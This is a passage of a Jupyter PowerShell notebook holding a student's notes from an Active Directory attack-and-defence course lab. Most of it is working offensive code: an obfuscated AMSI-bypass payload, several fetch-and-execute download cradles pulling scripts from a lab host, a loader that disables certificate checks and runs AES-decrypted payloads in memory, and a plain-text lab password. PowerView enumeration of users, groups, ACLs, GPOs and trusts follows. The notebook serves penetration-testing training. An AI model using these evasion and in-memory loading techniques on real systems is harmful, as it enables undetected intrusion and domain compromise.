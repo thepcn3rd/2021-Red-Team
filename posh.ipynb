{
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "# Pentester Academy - Attacking and Defending Active Directory\n",
        " "
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "## Day 1\n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Global Settings"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [],
      "source": [
        "# Prep powershell scripts to be downloaded...\n",
        "$outputDir = \"/home/kali/PTA/AttackDefense/output/\"\n",
        "# $scriptLocation = $outputDir + \"amsibypass.ps1\"\n",
        "# $output = @'\n",
        "#   Code\n",
        "# '@\n",
        "# $output | Out-File -Path $scriptLocation"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Load PowerView into Memory"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [
        {
          "data": {
            "text/plain": ""
          },
          "execution_count": 1,
          "metadata": {},
          "output_type": "execute_result"
        }
      ],
      "source": [
        "# Location of Raw PowerView \n",
        "# Download to output location\n",
        "# Execute with a Download Craddle\n",
        "$scriptLocation = $outputDir + \"powerview.ps1\"\n",
        "$urlPowerview = \"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1\"\n",
        "Invoke-WebRequest -Uri $urlPowerview -OutFile $scriptLocation\n",
        "#$vpnIP = \"172.16.99.56\"\n",
        "#$fileName = \"powerview.ps1\"\n",
        "#$url = \"http://$($vpnIP):8090/$($fileName)\"\n",
        "#$wr = [System.NET.WebRequest]::Create($url)\n",
        "#$r = $wr.GetResponse()\n",
        "#iex ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Load ActiveDirectory Powershell Module"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [
        {
          "data": {
            "text/plain": ""
          },
          "execution_count": 1,
          "metadata": {},
          "output_type": "execute_result"
        }
      ],
      "source": [
        "#Loads the dll into memory instead of saving to disk\n",
        "#iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory\n",
        "\n",
        "# Customized for the environment and across the VPN for Pentester Academy\n",
        "#PS > [byte[]] $DLL = Get-Content -Encoding byte -path C:\\ADModule\\Microsoft.ActiveDirectory.Management.dll\n",
        "#PS > [System.IO.File]::WriteAllLines(C:\\ADModule\\dll.txt, ([string]$DLL))\n",
        "#It is always advised to load your own DLL ;)\n",
        "\n",
        "# Saved the above powershell script to my output directory for further work...\n",
        "$scriptLocation = $outputDir + \"ADManagement.ps1\"\n",
        "$urlADModule = \"https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1\"\n",
        "Invoke-WebRequest -Uri $urlPowerview -OutFile $scriptLocation\n",
        "\n",
        "#$vpnIP = \"172.16.99.56\"\n",
        "#$fileName = \"ADManagement.ps1\"\n",
        "#$url = \"http://$($vpnIP):8090/$($fileName)\"\n",
        "#$wr = [System.NET.WebRequest]::Create($url)\n",
        "#$r = $wr.GetResponse()\n",
        "#iex ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()\n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### WinRM Authentication"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [
        {
          "data": {
            "text/plain": "\u001b[91mNew-PSSession: \n"
          },
          "execution_count": 1,
          "metadata": {},
          "output_type": "execute_result"
        },
        {
          "data": {
            "text/plain": "\u001b[96mLine |\n"
          },
          "execution_count": 1,
          "metadata": {},
          "output_type": "execute_result"
        },
        {
          "data": {
            "text/plain": "\u001b[96m   5 | \u001b[0m $s = \u001b[96mNew-PSSession -ComputerName dcorp-std756 -Authentication Negotia\u001b[0m …\n"
          },
          "execution_count": 1,
          "metadata": {},
          "output_type": "execute_result"
        },
        {
          "data": {
            "text/plain": "\u001b[96m     | \u001b[91m      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
          },
          "execution_count": 1,
          "metadata": {},
          "output_type": "execute_result"
        },
        {
          "data": {
            "text/plain": "\u001b[91m\u001b[96m     | \u001b[91m[dcorp-std756] An error has occurred which PowerShell cannot handle. A remote session might have ended.\u001b[0m\n"
          },
          "execution_count": 1,
          "metadata": {},
          "output_type": "execute_result"
        }
      ],
      "source": [
        "# Credential Setup \n",
        "# For the WSMan error - https://thomask.sdf.org/blog/2019/12/15/linux-windows-powershell-remoting-troubleshooting.html\n",
        "$pw = ConvertTo-SecureString -AsPlainText -Force -String \"vPM8JE244TRwPGhV\"\n",
        "$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"dcorp\\student756\",$pw\n",
        "$s = New-PSSession -ComputerName dcorp-std756 -Authentication Negotiate -Credential $cred\n",
        "\n",
        "# If the above works run the below to gain access\n",
        "# Enter-PSSession $s \n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### AMSI Bypass for the Lab"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [],
      "source": [
        "# AMSI Bypass for the Lab\n",
        "# Generate a different payload for AMSI bypass https://amsi.fail/\n",
        "# API Direct Connection - https://amsi-fail.azurewebsites.net/api/Generate\n",
        "$scriptLocation = $outputDir + \"amsibypass.ps1\"\n",
        "$output = @'\n",
        "sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  \"{1}{0}\"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( \"1Q2U\"  +\"zX\"  )  -VaL  ).\"A`ss`Embly\".\"GET`TY`Pe\"((  \"{6}{3}{1}{4}{2}{0}{5}\" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) ).\"g`etf`iElD\"(  ( \"{0}{2}{1}\" -f'amsi','d','InitFaile'  ),(  \"{2}{4}{0}{1}{3}\" -f 'Stat','i','NonPubli','c','c,'  )).\"sE`T`VaLUE\"(  ${n`ULl},${t`RuE} )\n",
        "'@\n",
        "$output | Out-File -Path $scriptLocation -Force\n",
        "\n",
        "#$vpnIP = \"172.16.99.56\"\n",
        "#$fileName = \"amsibypass.ps1\"\n",
        "#$url = \"http://$($vpnIP):8090/$($fileName)\"\n",
        "#$wr = [System.NET.WebRequest]::Create($url)\n",
        "#$r = $wr.GetResponse()\n",
        "#iex ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Download Options for Powershell Scripts prior to PSv3"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [],
      "source": [
        "# Download Script - Execute as it is downloaded - Powershell prior to PSv3\n",
        "$vpnIP = \"172.16.99.56\"\n",
        "$fileName = \"amsibypass.ps1\"\n",
        "$url = \"http://$($vpnIP):8090/$($fileName)\"\n",
        "iex (New-Object Net.WebClient).DownloadString($url)\n",
        "\n",
        "# One-liner for amsibypass\n",
        "$vpnIP = \"172.16.99.56\";$fileName = \"amsibypass.ps1\";$url = \"http://$($vpnIP):8090/$($fileName)\";iex (New-Object Net.WebClient).DownloadString($url)\n",
        "\n",
        "# One-liner for AD Management Tools DLL\n",
        "$vpnIP = \"172.16.99.56\";$fileName = \"AD.ps1\";$url = \"http://$($vpnIP):8090/$($fileName)\";iex (New-Object Net.WebClient).DownloadString($url)\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [],
      "source": [
        "# Download Script Using COM Objects - Prior to PSv3\n",
        "## Tested but did not work due to smartscreen\n",
        "$vpnIP = \"172.16.99.56\"\n",
        "$fileName = \"amsibypass.ps1\"\n",
        "$url = \"http://$($vpnIP):8090/$($fileName)\"\n",
        "$ie = New-Object -ComObject InternetExplorer.Application\n",
        "$ie.visible=$false\n",
        "$ie.navigate($url)\n",
        "sleep 5\n",
        "$response = $ie.Document.body.innerHTML\n",
        "$ie.quit()\n",
        "iex $response"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Download Options for Powershell Scripts PSv3 Onward"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [],
      "source": [
        "## Download Script - PSv3 Onwards\n",
        "$vpnIP = \"172.16.99.56\"\n",
        "$fileName = \"amsibypass.ps1\"\n",
        "$url = \"http://$($vpnIP):8090/$($fileName)\"\n",
        "iex (iwr $url)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [],
      "source": [
        "# Download with COM Object\n",
        "$vpnIP = \"172.16.99.56\"\n",
        "$fileName = \"amsibypass.ps1\"\n",
        "$url = \"http://$($vpnIP):8090/$($fileName)\"\n",
        "$h = New-Object -ComObject Msxml2.XMLHTTP\n",
        "$h.open('GET', $url, $false)\n",
        "$h.send()\n",
        "iex $h.responseText"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [],
      "source": [
        "# Download with .NET\n",
        "$vpnIP = \"172.16.99.56\"\n",
        "$fileName = \"amsibypass.ps1\"\n",
        "$url = \"http://$($vpnIP):8090/$($fileName)\"\n",
        "$wr = [System.NET.WebRequest]::Create($url)\n",
        "$r = $wr.GetResponse()\n",
        "iex ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [],
      "source": [
        "# Same as above - Download with .NET\n",
        "# TLS1.2 Enforcement and Ignoring a Self-Signed Certificate\n",
        "# Using a python3 http.server with a self-signed cert - sslServer.py needs to be launched\n",
        "# This python file is saved on google drive under Pentester Academy - PTA AD Attacking and Defending\n",
        "#\n",
        "\n",
        "if (-not ([System.Management.Automation.PSTypeName]'ServerCertificateValidationCallback').Type)\n",
        "{\n",
        "$certCallback = @\"\n",
        "    using System;\n",
        "    using System.Net;\n",
        "    using System.Net.Security;\n",
        "    using System.Security.Cryptography.X509Certificates;\n",
        "    public class ServerCertificateValidationCallback\n",
        "    {\n",
        "        public static void Ignore()\n",
        "        {\n",
        "            if(ServicePointManager.ServerCertificateValidationCallback ==null)\n",
        "            {\n",
        "                ServicePointManager.ServerCertificateValidationCallback += \n",
        "                    delegate\n",
        "                    (\n",
        "                        Object obj, \n",
        "                        X509Certificate certificate, \n",
        "                        X509Chain chain, \n",
        "                        SslPolicyErrors errors\n",
        "                    )\n",
        "                    {\n",
        "                        return true;\n",
        "                    };\n",
        "            }\n",
        "        }\n",
        "    }\n",
        "\"@\n",
        "    Add-Type $certCallback\n",
        " }\n",
        "[ServerCertificateValidationCallback]::Ignore()\n",
        "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 \n",
        "\n",
        "$vpnIP = \"172.16.99.56\"\n",
        "$fileName = \"a-test.ps1\"\n",
        "$url = \"https://$($vpnIP):8090/$($fileName)\"\n",
        "$wr = [System.NET.WebRequest]::Create($url)\n",
        "$r = $wr.GetResponse()\n",
        "iex ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()\n",
        "\n",
        "\n",
        "\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [],
      "source": [
        "# Same as above - Download with .NET\n",
        "# Decrypts files with AES and a Key\n",
        "# Prepare the files for decryption by using the v2aesEncryption.ps1 file...\n",
        "# TLS1.2 Enforcement and Ignoring a Self-Signed Certificate\n",
        "# Using a python3 http.server with a self-signed cert - sslServer.py needs to be launched\n",
        "# This python file is saved on google drive under Pentester Academy - PTA AD Attacking and Defending\n",
        "#\n",
        "\n",
        "function Create-AesManagedObject($key, $IV) {\n",
        "    $aesManaged = New-Object \"System.Security.Cryptography.AesManaged\"\n",
        "    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC\n",
        "    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros\n",
        "    $aesManaged.BlockSize = 128\n",
        "    $aesManaged.KeySize = 256\n",
        "    if ($IV) {\n",
        "        if ($IV.getType().Name -eq \"String\") {\n",
        "            $aesManaged.IV = [System.Convert]::FromBase64String($IV)\n",
        "        }\n",
        "        else {\n",
        "            $aesManaged.IV = $IV\n",
        "        }\n",
        "    }\n",
        "    if ($key) {\n",
        "        if ($key.getType().Name -eq \"String\") {\n",
        "            $aesManaged.Key = [System.Convert]::FromBase64String($key)\n",
        "        }\n",
        "        else {\n",
        "            $aesManaged.Key = $key\n",
        "        }\n",
        "    }\n",
        "    $aesManaged\n",
        "}\n",
        "\n",
        "function Decrypt-String($key, $encryptedStringWithIV) {\n",
        "    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)\n",
        "    $IV = $bytes[0..15]\n",
        "    $aesManaged = Create-AesManagedObject $key $IV\n",
        "    $decryptor = $aesManaged.CreateDecryptor();\n",
        "    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);\n",
        "    $aesManaged.Dispose()\n",
        "    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)\n",
        "}\n",
        "\n",
        "function Invoke-Lefty ($baseName)\n",
        "{\n",
        "\n",
        "if (-not ([System.Management.Automation.PSTypeName]'ServerCertificateValidationCallback').Type)\n",
        "{\n",
        "$certCallback = @\"\n",
        "    using System;\n",
        "    using System.Net;\n",
        "    using System.Net.Security;\n",
        "    using System.Security.Cryptography.X509Certificates;\n",
        "    public class ServerCertificateValidationCallback\n",
        "    {\n",
        "        public static void Ignore()\n",
        "        {\n",
        "            if(ServicePointManager.ServerCertificateValidationCallback ==null)\n",
        "            {\n",
        "                ServicePointManager.ServerCertificateValidationCallback += \n",
        "                    delegate\n",
        "                    (\n",
        "                        Object obj, \n",
        "                        X509Certificate certificate, \n",
        "                        X509Chain chain, \n",
        "                        SslPolicyErrors errors\n",
        "                    )\n",
        "                    {\n",
        "                        return true;\n",
        "                    };\n",
        "            }\n",
        "        }\n",
        "    }\n",
        "\"@\n",
        "    Add-Type $certCallback\n",
        " }\n",
        "[ServerCertificateValidationCallback]::Ignore()\n",
        "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 \n",
        "\n",
        "$vpnIP = \"172.16.99.56\"\n",
        "#$vpnIP = \"172.16.53.128\"\n",
        "# Future idea, pull the key from the web server so it is not present in the logs...\n",
        "#$baseName = \"v4amsi.ps1\"\n",
        "$baseName = $baseName.SubString(0,$baseName.Length-4)\n",
        "$fileName = \"$($baseName).enc\"\n",
        "$keyFile = \"$($baseName).key\"\n",
        "$url = \"https://$($vpnIP):8090/$($fileName)\"\n",
        "$urlkey = \"https://$($vpnIP):8090/$($keyFile)\"\n",
        "$wr = [System.NET.WebRequest]::Create($url)\n",
        "$wrkey = [System.NET.WebRequest]::Create($urlkey)\n",
        "$r = $wr.GetResponse()\n",
        "$rkey = $wrkey.GetResponse()\n",
        "$ekey = ([System.IO.StreamReader]($rkey.GetResponseStream())).ReadToEnd() \n",
        "$e = ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd() \n",
        "iex (Decrypt-String $ekey $e)\n",
        "\n",
        "}\n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Domain Enumeration"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [],
      "source": [
        "$scriptLocation = $outputDir + \"getdomain.ps1\"\n",
        "$output = @'\n",
        "#   Code\n",
        "$ADCLass = [System.DirectoryServices.ActiveDirectory.Domain]\n",
        "$ADClass::GetCurrentDomain()\n",
        "'@\n",
        "$output | Out-File -Path $scriptLocation"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [],
      "source": [
        "# Powerview commands\n",
        "# Pull all domains \n",
        "Get-NetDomain\n",
        "\n",
        "# Pull information about a specific domain\n",
        "Get-NetDomain -Domain moneycorp.local\n",
        "\n",
        "# Pull the domainSID for the \n",
        "Get-DomainSID\n",
        "\n",
        "# Pull the domain group policies\n",
        "Get-DomainPolicy\n",
        "\n",
        "# Gather a specific domain policy\n",
        "Get-DomainPolicy -Policy \"Default Domain Policy\"\n",
        "\n",
        "# Gather the policies from a specific domain\n",
        "Get-DomainPolicy -Domain moneycorp.local\n",
        "\n",
        "# Gather the domain controllers in the domain\n",
        "Get-NetDomainController\n",
        "\n",
        "# Gather the domain controllers of another domain\n",
        "Get-NetDomainController -Domain moneycorp.local"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [],
      "source": [
        "# ADModule commands\n",
        "Get-ADDomain\n",
        "Get-ADDomain -Identity moneycorp.local\n",
        "(Get-ADDomain).DomainSID\n",
        "\n",
        "# View the domain controllers in the domain\n",
        "Get-ADDomainController\n",
        "\n",
        "# View the domain controllers in a specific domain in a forest\n",
        "Get-ADDomainController -DomainName moneycorp.loca -Discover"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### ADUser Account Enumeration"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [],
      "source": [
        "# Powerview - User Enumeration\n",
        "Get-NetUser\n",
        "# Filter based on user accounts\n",
        "Get-NetUser | Select cn\n",
        "\n",
        "# Gather information about a specific user\n",
        "Get-NetUser -Username student1\n",
        "\n",
        "# Gather list of all properties for users in the current domain\n",
        "# Below is not working from PowerView - Imported the powerview he had on the box\n",
        "Get-UserProperty -Domain moneycorp.local -Server <servername> -Properties logoncount\n",
        "\n",
        "# Get Last Logged on User\n",
        "Get-NetLoggedon -ComputerName <servername>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [],
      "source": [
        "# AD Native commands for User Enumeration\n",
        "Get-ADUser -Filter * -Properties *\n",
        "Get-ADUser -Identity student1 -Properties *\n",
        "\n",
        "# Gather the properties of a given user account\n",
        "Get-ADUser -Filter * -Properties * | Select -First 1 | Get-Member -MemberType *Property | select name\n",
        "Get-ADuser -Filter * -Properties * | select name, enabled\n",
        "\n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### ADComputer Account Enumeration"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [],
      "source": [
        "# Powerview\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [],
      "source": [
        "# AD Management Module\n",
        "Get-ADComputer -Properties * -Filter *\n",
        "\n",
        "# Filter based on Operating System\n",
        "Get-ADComputer -Filter 'OperatingSystem -like \"*Server 2016*\"' -Properties OperatingSystem "
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### ADGroup Enumeration"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [],
      "source": [
        "# AD Module\n",
        "Get-ADGroup -Filter * | select name\n",
        "\n",
        "# Groups with admin in them\n",
        "Get-ADGroup -Filter 'Name -like \"*admin*\"' | select Name\n",
        "\n",
        "# The enterprise admins group is only present in the forest...\n",
        "\n",
        "# Get members of the AD Group\n",
        "Get-ADGroupMember -Identity \"Domain Admins\" -Recursive\n",
        "\n",
        "\n",
        "## Local Groups on a machine can be gathered if administrator privs on non-dc machines\n",
        "# Powerview\n",
        "Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Recurse"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Objective 1\n",
        "````\n",
        "Enumerate the Following\n",
        "Users\n",
        "Computers\n",
        "Domain Administrators\n",
        "Enterprise Administrators *Only works at the top of the forest domain (Flag is the SID of the Enterprise Admin)\n",
        "Shares \n",
        "````"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [],
      "source": [
        "# Get My Current Domain\n",
        "# Load the AD Management Module\n",
        "# Load Powerview into Memory\n",
        "$scriptLocation = $outputDir + \"obj1.ps1\"\n",
        "$output = @'\n",
        "$currentDomainInfo = Get-ADDomain\n",
        "$currentDomain = $currentDomainInfo.DNSRoot\n",
        "$parentDomain = $currentDomainInfo.ParentDomain\n",
        "$childDomainList = $currentDomain.ChildDomains\n",
        "\n",
        "# Domain Controllers of the current domain\n",
        "Get-ADDomainController -DomainName $currentDomain -Discover\n",
        "\n",
        "# Gather users of the current domain\n",
        "Get-ADUser -Filter * -Properties * | select name, SID\n",
        "\n",
        "# Gather computers from current domain\n",
        "Get-ADComputer -Filter * -Properties * | select name, SID\n",
        "\n",
        "# To collect the users from another domain in the forest include the domain under the server paramter\n",
        "# Gather users of the parent domain\n",
        "Get-ADUSer -Filter * -Properties * -Server $parentDomain\n",
        "\n",
        "# Gather the group names from the parent domain\n",
        "Get-ADGroup -Filter * -Properties * -Server $parentDomain\n",
        "\n",
        "# Gather the members of the Enterprise admins from the parent domain\n",
        "Get-ADGroupMember -Identity \"Enterprise Admins\" -Server $parentDomain\n",
        "\n",
        "# Invoke Sharefinder\n",
        "Invoke-ShareFinder \n",
        "'@\n",
        "$output | Out-File -Path $scriptLocation"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "````\n",
        "Output\n",
        "Forest                  : moneycorp.local\n",
        "DomainControllers       : {dcorp-dc.dollarcorp.moneycorp.local}\n",
        "Children                : {us.dollarcorp.moneycorp.local}\n",
        "DomainMode              : Unknown\n",
        "DomainModeLevel         : 7\n",
        "Parent                  : moneycorp.local\n",
        "PdcRoleOwner            : dcorp-dc.dollarcorp.moneycorp.local\n",
        "RidRoleOwner            : dcorp-dc.dollarcorp.moneycorp.local\n",
        "InfrastructureRoleOwner : dcorp-dc.dollarcorp.moneycorp.local\n",
        "Name                    : dollarcorp.moneycorp.local\n",
        "\n",
        "````"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Domain Enumeration - GPO\n",
        "````\n",
        "You need to use the Powerview module for Get-NetGPO\n",
        "````"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [],
      "source": [
        "# Additional commands to execute\n",
        "# Find shares on domain computers\n",
        "Invoke-ShareFinder\n",
        "\n",
        "# Find files on domain computers\n",
        "Invoke-FileFinder\n",
        "\n",
        "# Get file servers on the domain\n",
        "Get-NetFileServer"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [],
      "source": [
        "# Enumerate GPOs\n",
        "Get-NetGPO"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [],
      "source": [
        "# Enumerate OUs\n",
        "Get-NetOU\n",
        "Get-NetOU | Select Name\n",
        "\n",
        "Get-NetGPO -GPOname \"{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}\""
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Objective 2\n",
        "\n",
        "````\n",
        "Enumerate on dollarcorp domain\n",
        "List of all OUs\n",
        "List all the computers in teh StudentMachines OU\n",
        "List the GPOs\n",
        "Enumerate GPO applied on the StudentMachines OU\n",
        "````"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [],
      "source": [
        "$scriptLocation = $outputDir + \"obj2.ps1\"\n",
        "$output = @'\n",
        "# List all OU's\n",
        "Get-NetOU\n",
        "\n",
        "# List the machines that the OU applies to...\n",
        "Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_}\n",
        "\n",
        "# List the GPOs\n",
        "Get-NetGPO\n",
        "\n",
        "\n",
        "# From the output find the gplink for the group policies linked to studentmachines\n",
        "Get-NetOU StudentMachines -FullData\n",
        "\n",
        "# Get the GPO applied to StudentMachines...  More than 1 could exist\n",
        "# Copy the gplink into the ADSPath variable\n",
        "Get-NetGPO -ADSpath 'LDAP://cn={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local'\n",
        "'@\n",
        "$output | Out-File -Path $scriptLocation"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Domain Enumeration - ACL"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [],
      "source": [
        "# Powerview\n",
        "Get-ObjectAcl -SamAccountName student756 -ResolveGUIDs\n",
        "# ObjectDN is what has access on the account student756\n",
        "\n",
        "# Search using an ADSPrefix\n",
        "Get-ObjectAcl -ADSprefix 'CN=Administrator,CN=Users' -Verbose\n",
        "\n",
        "# Search using LDAP\n",
        "Get-ObjectAcl -ADSpath \"LDAP://CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local\" -ResolveGUIDs -Verbose\n",
        "\n",
        "# Using AD you need to know the CN\n",
        "# for the default administrator account - then for readability send it to a format-list\n",
        "Get-Acl 'AD:\\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local' | Format-List\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [],
      "source": [
        "# Search for Interesting ACEs for the current user\n",
        "Invoke-ACLScanner -ResolveGUIDs\n",
        "\n",
        "# Run the ACLScanner for my specific user account\n",
        "Invoke-ACLScanner -ResolveGUIDs -SamAccountName student756"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [],
      "source": [
        "# Path ACLs\n",
        "Get-PathAcl -Path \"\\\\dcorp-dc.dollarcorp.moneycorp.local\\sysvol\""
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Objective 3\n",
        "````\n",
        "Enumerate the following for the dollarcorp domain:\n",
        "ACL for the Users Group\n",
        "ACL for teh Domain Admins Group\n",
        "All modify rights/permissions for teh student756\n",
        "````"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [],
      "source": [
        "#ACL for the Users Group\n",
        "Get-ObjectAcl -SamAccountName student756 -ResolveGUIDs -Verbose\n",
        "\n",
        "# Domain Admins Group\n",
        "Get-ObjectAcl -SamAccountName \"Domain Admins\" -ResolveGUIDs -Verbose\n",
        "\n",
        "# Gather the ACLs on the GPOs that Exist\n",
        "get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}\n",
        "\n",
        "# Enumerate those GPOs where studentx or RDPUsers group have interesting permissions\n",
        "get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ?{$_.IdentityReference -match \"rdpusers\"}\n",
        "\n",
        "# Scan with Inovke-ACL Scanners for a specific user\n",
        "Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match \"student\"}\n",
        "\n",
        "# Specific Group\n",
        "Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match \"RDPUsers\"}\n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Objective 4\n",
        "\n",
        "````\n",
        "Enumerate all domains in the moneycorp.local forest\n",
        "Map the trusts of the dollarcorp.moneycorp.local domain\n",
        "Map External trusts in moneycorp.local forest\n",
        "Identify external trusts of dollarcorp domain.  Can you enumerate trusts for a trusting forest?\n",
        "````"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "dotnet_interactive": {
          "language": "pwsh"
        }
      },
      "outputs": [],
      "source": [
        "# Forest Domain Information\n",
        "Get-NetForestDomain -Verbose\n",
        "\n",
        "# moneycorp.local - Forest\n",
        "# dollarcorp.moneycorp.local - Child\n",
        "# us.dollarcorp.moneycorp.local - Grandchild\n",
        "\n",
        "# Domain Trusts\n",
